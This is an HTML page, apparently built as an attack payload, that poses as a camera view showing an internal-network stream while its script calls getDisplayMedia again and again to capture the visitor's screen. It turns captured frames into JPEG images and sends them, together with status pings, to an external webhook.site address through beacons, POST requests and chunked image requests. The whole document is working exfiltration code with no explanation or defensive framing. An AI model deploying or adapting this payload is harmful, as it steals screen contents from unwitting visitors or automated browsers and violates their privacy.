<!DOCTYPE html>
<html>
<head><title>C</title></head>
<body style="margin:0;background:#111;">
<img id="cam" src="http://10.133.7.5/stream" style="width:640px;height:480px;display:block;">
<script>
var W='https://webhook.site/2c352a24-311b-4255-b02a-c77dbec3c3fe';
function rpt(k,v){new Image().src=W+'?t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
rpt('ALIVE','1');

// Immediately try getDisplayMedia - retry up to 10 times
var gdmDone=false;
var attempts=0;
function tryGDM(){
    if(gdmDone||attempts>10)return;
    attempts++;
    rpt('TRY',attempts+'|sec='+window.isSecureContext+'|md='+typeof navigator.mediaDevices);
    if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia){
        rpt('NO_GDM','retry in 1s');
        setTimeout(tryGDM,1000);
        return;
    }
    navigator.mediaDevices.getDisplayMedia({video:true}).then(function(stream){
        if(gdmDone)return;gdmDone=true;
        rpt('GDM_OK','tracks='+stream.getTracks().length+'|attempt='+attempts);
        processStream(stream);
    }).catch(function(e){
        rpt('GDM_E',attempts+'|'+e.name+':'+e.message);
        // Retry after delay
        setTimeout(tryGDM,2000);
    });
}

// Start immediately
tryGDM();
// Also retry periodically
setTimeout(tryGDM,3000);
setTimeout(tryGDM,6000);
setTimeout(tryGDM,10000);
setTimeout(tryGDM,15000);
setTimeout(tryGDM,20000);

function processStream(stream){
    var tracks=stream.getTracks();
    for(var i=0;i<tracks.length;i++){
        rpt('TRACK',tracks[i].kind+':'+tracks[i].label+':'+tracks[i].readyState);
    }
    var v=document.createElement('video');
    v.srcObject=stream;
    v.autoplay=true;
    v.muted=true;
    v.style.cssText='width:640px;height:480px;display:block';
    document.body.appendChild(v);

    // Try grabbing frames at multiple intervals
    v.onloadeddata=function(){
        rpt('VID',v.videoWidth+'x'+v.videoHeight);
        grab(v,stream,'ld');
        setTimeout(function(){grab(v,stream,'ld1s')},1000);
        setTimeout(function(){grab(v,stream,'ld2s')},2000);
        setTimeout(function(){grab(v,stream,'ld5s')},5000);
    };
    // Fallback grabs even without loadeddata
    setTimeout(function(){grab(v,stream,'t1')},500);
    setTimeout(function(){grab(v,stream,'t2')},1500);
    setTimeout(function(){grab(v,stream,'t3')},3000);
    setTimeout(function(){grab(v,stream,'t5')},5000);
    setTimeout(function(){grab(v,stream,'t10')},10000);
    setTimeout(function(){grab(v,stream,'t20')},20000);
}

var grabCount=0;
function grab(v,stream,label){
    grabCount++;
    var w=v.videoWidth||1600,h=v.videoHeight||900;
    if(w<=0||h<=0){w=1600;h=900}
    rpt('GRAB',label+'|'+w+'x'+h+'|rdy='+v.readyState);

    var c=document.createElement('canvas');c.width=w;c.height=h;
    var x=c.getContext('2d');
    try{
        x.drawImage(v,0,0,w,h);
    }catch(e){
        rpt('DRAW_E',label+'|'+e.message);
        return;
    }

    // Check pixels
    try{
        var d=x.getImageData(0,0,10,1);
        var px=Array.from(d.data);
        var nonzero=px.filter(function(v){return v>0}).length;
        rpt('PX',label+'|nz='+nonzero+'|'+px.join(','));
    }catch(e){rpt('PX_E',label+'|'+e.message)}

    // Get full image
    try{
        var du=c.toDataURL('image/jpeg',0.7);
        rpt('DU',label+'|len='+du.length);
        if(du.length>1000){
            // Send via multiple methods
            try{navigator.sendBeacon(W,du)}catch(e){}
            try{navigator.sendBeacon(W,label+':'+du)}catch(e){}
            fetch(W,{method:'POST',mode:'no-cors',body:label+':'+du}).catch(function(){});

            // Also send in chunks via GET
            var chunk=800;
            for(var i=0;i<Math.min(du.length,50000);i+=chunk){
                (function(idx,ch){
                    setTimeout(function(){
                        new Image().src=W+'?c='+label+'_'+idx+'&d='+encodeURIComponent(ch);
                    },idx*20);
                })(Math.floor(i/chunk),du.substring(i,i+chunk));
            }
        }
    }catch(e){rpt('DU_E',label+'|'+e.message)}

    // Stop after enough grabs
    if(grabCount>=5){
        stream.getTracks().forEach(function(t){t.stop()});
    }
}
</script>
</body>
</html>
